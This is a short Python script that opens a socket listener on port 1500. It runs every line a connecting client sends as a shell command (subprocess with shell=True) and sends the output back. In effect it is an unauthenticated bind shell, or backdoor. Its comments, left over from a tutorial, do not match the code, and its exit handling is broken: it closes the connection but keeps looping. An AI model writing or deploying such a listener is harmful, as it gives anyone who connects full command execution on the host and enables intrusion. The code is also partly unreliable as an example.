import subprocess
import socket
s = socket.socket()          
print ("Socket successfully created")
  
# reserve a port on your computer in our 
# case it is 12345 but it can be anything 
port = 1500               
  
# Next bind to the port 
# we have not typed any ip in the ip field 
# instead we have inputted an empty string 
# this makes the server listen to requests  
# coming from other computers on the network
#192.168.0.33
s.bind(('127.0.0.1', port))         
print ("socket binded to %s" %(port)) 
  
# put the socket into listening mode 
s.listen(5)      
print ("socket is listening")            
  
# a forever loop until we interrupt it or  
# an error occurs
c, addr = s.accept()
while True: 
  
   # Establish connection with client.       
   print ('Got connection from', addr)
  
   # send a thank you message to the client.  
   c.send(b'Thank you for connecting')
   data=str(c.recv(1024),'ascii','ignore').split('\n')[0]
   print(data)
   retrn=subprocess.run(data,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,shell=True)
   print(str(retrn.stdout.decode('utf-8')))
   c.send(retrn.stdout)
   # Close the connection with the client 
   if data=='exit':
      c.close()
